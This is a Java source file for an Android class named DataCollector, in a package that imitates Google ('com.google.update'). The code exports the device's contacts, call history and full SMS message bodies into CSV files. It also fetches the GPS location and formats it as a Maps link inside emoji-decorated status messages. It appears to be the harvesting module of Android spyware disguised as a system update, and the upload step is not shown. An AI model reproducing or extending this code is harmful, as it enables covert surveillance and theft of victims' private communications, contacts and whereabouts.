package com.google.update;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
public class DataCollector {
    private static final SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
    public static File getContacts(Context ctx) {
        try {
            File f = new File(ctx.getCacheDir(), "contacts.csv");
            OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
            w.write('\ufeff');
            w.write("Name,Phone\n");
            ContentResolver cr = ctx.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                        if (pCur != null) {
                            while (pCur.moveToNext()) {
                                String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                w.write("\"" + (name != null ? name : "") + "\",\"" + (phone != null ? phone : "") + "\"\n");
                            }
                            pCur.close();
                        }
                    }
                }
                cur.close();
            }
            w.close();
            return f;
        } catch (Exception e) { return null; }
    }
    public static File getCallLogs(Context ctx) {
        try {
            File f = new File(ctx.getCacheDir(), "calls.csv");
            OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
            w.write('\ufeff');
            w.write("Number,Type,Date,Duration\n");
            Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = c.getString(c.getColumnIndex(CallLog.Calls.TYPE));
                    String date = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
                    String dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                    String t;
                    switch (Integer.parseInt(type)) {
                        case CallLog.Calls.INCOMING_TYPE: t = "IN"; break;
                        case CallLog.Calls.OUTGOING_TYPE: t = "OUT"; break;
                        default: t = "MISSED";
                    }
                    w.write("\"" + (num != null ? num : "") + "\",\"" + t + "\",\"" + sdf.format(new Date(Long.parseLong(date))) + "\",\"" + dur + "\"\n");
                }
                c.close();
            }
            w.close();
            return f;
        } catch (Exception e) { return null; }
    }
    public static File getSMS(Context ctx) {
        try {
            File f = new File(ctx.getCacheDir(), "sms.csv");
            OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
            w.write('\ufeff');
            w.write("Type,Address,Date,Body\n");
            if (Build.VERSION.SDK_INT >= 19) {
                Cursor c = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
                if (c != null) {
                    while (c.moveToNext()) {
                        String addr = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                        String date = c.getString(c.getColumnIndex(Telephony.Sms.DATE));
                        String type = c.getString(c.getColumnIndex(Telephony.Sms.TYPE));
                        String t = type.equals("1") ? "IN" : (type.equals("2") ? "OUT" : "DRAFT");
                        w.write("\"" + t + "\",\"" + (addr != null ? addr : "") + "\",\"" + sdf.format(new Date(Long.parseLong(date))) + "\",\"" + (body != null ? body.replace("\n", " ") : "") + "\"\n");
                    }
                    c.close();
                }
            }
            w.close();
            return f;
        } catch (Exception e) { return null; }
    }
    public static String getDeviceName() {
        return Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
    }
    public static void getLocation(Context ctx, LocationCallback cb) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) { cb.onResult("❌ Location not available"); return; }
            if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) { cb.onResult("❌ Please enable GPS"); return; }
            LocationListener listener = new LocationListener() {
                @Override public void onLocationChanged(Location loc) {
                    String url = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                    cb.onResult("📍 Location:\nLat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude() + "\n🗺️ " + url);
                }
                @Override public void onProviderDisabled(String p) { cb.onResult("❌ GPS disabled"); }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
            };
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            new Timer().schedule(new TimerTask() { public void run() { cb.onResult("❌ Location timeout"); } }, 15000);
        } catch (SecurityException e) { cb.onResult("❌ Location permission denied"); }
    }
    public interface LocationCallback { void onResult(String r); }
}
